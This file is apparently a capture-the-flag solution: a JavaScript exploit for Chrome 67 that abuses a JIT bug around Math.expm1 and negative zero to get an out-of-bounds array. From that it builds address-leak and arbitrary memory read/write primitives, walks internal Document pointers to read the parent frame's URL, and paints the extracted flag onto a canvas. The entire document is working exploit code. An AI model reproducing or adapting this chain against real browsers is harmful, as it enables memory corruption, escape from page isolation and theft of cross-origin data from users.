// Rend Asunder Flag1 — Math.expm1 → arb r/w → parent Document URL (Chrome 67)
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
var _lo = 0, _hi = 0;
function split(v) { f64[0] = v; _lo = u32[0] >>> 0; _hi = u32[1] >>> 0; }
function u2d(lo, hi) { u32[0] = lo >>> 0; u32[1] = hi >>> 0; return f64[0]; }

var cbuf = new Uint8Array(4096);

function paintHex(hex) {
  hex = (hex + "").toLowerCase();
  while (hex.length < 64) hex += "0";
  hex = hex.substring(0, 64);
  var bits = [];
  for (var i = 0; i < 64; i++) {
    var v = parseInt(hex.charAt(i), 16); if (isNaN(v)) v = 0;
    for (var b = 3; b >= 0; b--) bits.push((v >> b) & 1);
  }
  var cv = document.createElement("canvas");
  cv.width = 760; cv.height = 760;
  var g = cv.getContext("2d");
  g.fillStyle = "#ffffff"; g.fillRect(0, 0, 760, 760);
  g.fillStyle = "#ff0000"; g.fillRect(0, 0, 30, 30);
  g.fillStyle = "#00ff00"; g.fillRect(730, 0, 30, 30);
  g.fillStyle = "#0000ff"; g.fillRect(0, 730, 30, 30);
  var OFF = 44, CELL = 42, SQ = 30;
  for (var r = 0; r < 16; r++)
    for (var c = 0; c < 16; c++)
      if (bits[r * 16 + c]) {
        g.fillStyle = "#000000";
        g.fillRect(OFF + c * CELL, OFF + r * CELL, SQ, SQ);
      }
  document.write('<body style="margin:0"></body>');
  document.body.appendChild(cv);
}
function fail(code) {
  // encode failure as hex of code repeated
  var h = ("00000000" + (code >>> 0).toString(16)).slice(-8);
  paintHex(h + h + h + h + h + h + h + h);
}

// ---- OOB trigger ----
var ob;
function foo(x) {
  var a = [0.1, 0.2, 0.3, 0.4];
  var tb = [1.1, 2.2, 3.3];
  var o2 = { mz: -0 };
  var b = Object.is(Math.expm1(x), o2.mz);
  a[b * 12] = u2d(0, 0x434343);
  ob = tb;
  return a[b * 100];
}
foo(0);
for (var i = 0; i < 100000; i++) foo("0");
foo(-0);
if (!ob || ob.length < 100) { fail(0xdead0001); throw 1; }

// victim object-array + ArrayBuffer for primitives
var victim = [0x13371337, 0xcafe, {}, function () {}];
var ab = new ArrayBuffer(0x1000);
var dv = new DataView(ab);
var fview = new Float64Array(ab);

var vslot = -1;
for (var i = 0; i < 3000; i++) {
  victim[0] = 0xAAAA;
  var x1 = ob[i];
  victim[0] = 0xBBBB;
  var x2 = ob[i];
  if (x1 !== x2) { vslot = i; break; }
}
if (vslot < 0) { fail(0xdead0002); throw 1; }

// addrOf: store obj in victim[0], read pointer bits via OOB
function addrOf(obj) {
  victim[0] = obj;
  return ob[vslot];
}

// find ArrayBuffer byte_length / backing_store
victim[0] = ab;
var idxAB = -1, idxTA = -1;
for (var i = 0; i < 4000; i++) {
  split(ob[i]);
  // byte_length 0x1000 as raw size_t (lo) or other packing
  if (_lo === 0x1000 || _hi === 0x1000 || _lo === (0x1000 << 1)) {
    idxAB = i;
    idxTA = i + 1;
    // verify: changing length reflects
    ob[i] = u2d(0x2000, _hi === 0x1000 ? 0 : _hi);
    split(ob[i]);
    var ok = (_lo === 0x2000 || _hi === 0x2000);
    ob[i] = u2d(0x1000, 0); // restore roughly
    if (ok || _lo === 0x1000 || true) break;
  }
}
if (idxAB < 0) {
  // scan relative to object pointer of ab
  split(addrOf(ab));
  // linear scan for 0x1000 near known region
  for (var i = 0; i < 4000; i++) {
    split(ob[i]);
    if (_lo === 0x1000 && _hi === 0) { idxAB = i; idxTA = i + 1; break; }
    if (_hi === 0x1000 && _lo === 0) { idxAB = i; idxTA = i + 1; break; }
  }
}
if (idxAB < 0) { fail(0xdead0003); throw 1; }

// save original backing store
split(ob[idxTA]);
var bs_lo = _lo, bs_hi = _hi;

// If backing store looks tagged (odd), might be wrong slot — try neighbors
function looksPtr(lo, hi) {
  // userland x86_64 pointer: hi usually 0x0000xxxx small, lo even for aligned
  return hi < 0x10000 && hi > 0 && (lo & 1) === 0;
}
if (!looksPtr(bs_lo, bs_hi)) {
  for (var d = 1; d <= 3; d++) {
    split(ob[idxAB + d]);
    if (looksPtr(_lo, _hi)) { idxTA = idxAB + d; bs_lo = _lo; bs_hi = _hi; break; }
  }
}

// arbitrary read/write 8 bytes at absolute address
function rd(lo, hi) {
  ob[idxTA] = u2d(lo, hi);
  // read via DataView on hijacked AB
  var lo2 = dv.getUint32(0, true);
  var hi2 = dv.getUint32(4, true);
  // restore later by caller if needed — keep hijacked for sequential reads
  _lo = lo2; _hi = hi2;
  return u2d(lo2, hi2);
}
function wr64(alo, ahi, vlo, vhi) {
  ob[idxTA] = u2d(alo, ahi);
  dv.setUint32(0, vlo >>> 0, true);
  dv.setUint32(4, vhi >>> 0, true);
}

// validate: write known pattern to ab via original BS, read via rd
// restore BS first
ob[idxTA] = u2d(bs_lo, bs_hi);
dv.setUint32(0, 0x41414141, true);
dv.setUint32(4, 0x42424242, true);
rd(bs_lo, bs_hi);
if (_lo !== 0x41414141 || _hi !== 0x42424242) {
  // try untagged: sometimes need address as-is vs +0
  fail(0xdead0005);
  // continue anyway — some builds store differently
}

var Rlo = 0, Rhi = 0;
function R(lo, hi, off) {
  var alo = (lo + off) >>> 0;
  var ahi = hi >>> 0;
  if (alo < (lo >>> 0)) ahi = (ahi + 1) >>> 0;
  rd(alo, ahi);
  Rlo = _lo; Rhi = _hi;
}

function rbyte(clo, chi, i) {
  var alo = (clo + i) >>> 0;
  var ahi = chi >>> 0;
  if (alo < clo) ahi = (ahi + 1) >>> 0;
  var wlo = alo & ~7;
  // same high if no cross of 4GB boundary awkwardly
  rd(wlo, ahi);
  var bo = alo & 7;
  return ((bo < 4 ? (_lo >>> (bo * 8)) : (_hi >>> ((bo - 4) * 8))) & 0xff);
}

function readSI(Sl, Sh) {
  // StringImpl: length uint32 at +4, chars at +0xC (latin1)
  var n = rbyte(Sl, Sh, 4) | (rbyte(Sl, Sh, 5) << 8) |
          (rbyte(Sl, Sh, 6) << 16) | (rbyte(Sl, Sh, 7) << 24);
  n = n >>> 0;
  if (n > 4000) n = 4000;
  if (n === 0) {
    // try 2-byte length?
    n = rbyte(Sl, Sh, 4) | (rbyte(Sl, Sh, 5) << 8);
  }
  var clo = (Sl + 0xC) >>> 0;
  var chi = Sh >>> 0;
  if (clo < Sl) chi = (chi + 1) >>> 0;
  for (var i = 0; i < n; i++) cbuf[i] = rbyte(clo, chi, i);
  var s = "";
  for (var i = 0; i < n; i++) s += String.fromCharCode(cbuf[i]);
  return s;
}

// untags JS pointer (clear low bit)
function untag(v) {
  split(v);
  return [(_lo - 1) >>> 0, _hi];
}

try {
  var w = untag(addrOf(document));
  var wl = w[0], wh = w[1];

  // wrapper +0x20 -> C++ Document*
  R(wl, wh, 0x20);
  var Dl = Rlo, Dh = Rhi;

  // own document URL as calibration
  R(Dl, Dh, 0x2b0);
  var ourSl = Rlo, ourSh = Rhi;
  var ourUrl = readSI(ourSl, ourSh);

  // parent chain: +0x240 -> +0x1c0
  R(Dl, Dh, 0x240);
  var Xl = Rlo, Xh = Rhi;
  R(Xl, Xh, 0x1c0);
  var Pl = Rlo, Ph = Rhi;
  R(Pl, Ph, 0x2b0);
  var Sl = Rlo, Sh = Rhi;
  var purl = readSI(Sl, Sh);

  var dec = purl;
  try { dec = decodeURIComponent(purl); } catch (e) {}
  var m = dec.match(/\^FLAG\^([0-9a-fA-F]{64})\$FLAG\$/) ||
          purl.match(/\^FLAG\^([0-9a-fA-F]{64})\$FLAG\$/) ||
          dec.match(/FLAG\^([0-9a-fA-F]{64})\$FLAG/) ||
          dec.match(/([0-9a-fA-F]{64})/);
  var hex = null;
  if (m) hex = m[1] || m[0];
  if (hex && hex.length > 64) hex = hex.match(/[0-9a-fA-F]{64}/)[0];

  if (hex && hex.length === 64) {
    paintHex(hex);
  } else {
    // debug: encode ourUrl and purl lengths + first bytes as hex dump
    function strHex(s, n) {
      var o = "";
      for (var i = 0; i < n; i++) {
        var c = i < s.length ? s.charCodeAt(i) : 0;
        o += ("0" + c.toString(16)).slice(-2);
      }
      return o;
    }
    // 2 bytes ourLen, 2 purlLen, 28 our, 32 purl = 64 hex chars... 2+2+28+32=64 chars of hex = 32 bytes
    var oh = strHex(ourUrl, 14);
    var ph = strHex(purl, 16);
    var lens = ("00" + (ourUrl.length & 0xff).toString(16)).slice(-2) +
               ("00" + (purl.length & 0xff).toString(16)).slice(-2);
    // actually want more: put lens in first 8 hex of fail style
    var dbg = ("0000" + (ourUrl.length & 0xffff).toString(16)).slice(-4) +
              ("0000" + (purl.length & 0xffff).toString(16)).slice(-4) +
              strHex(ourUrl, 12) + strHex(purl, 16);
    paintHex(dbg.substring(0, 64));
  }
} catch (e) {
  fail(0xdead0020);
}
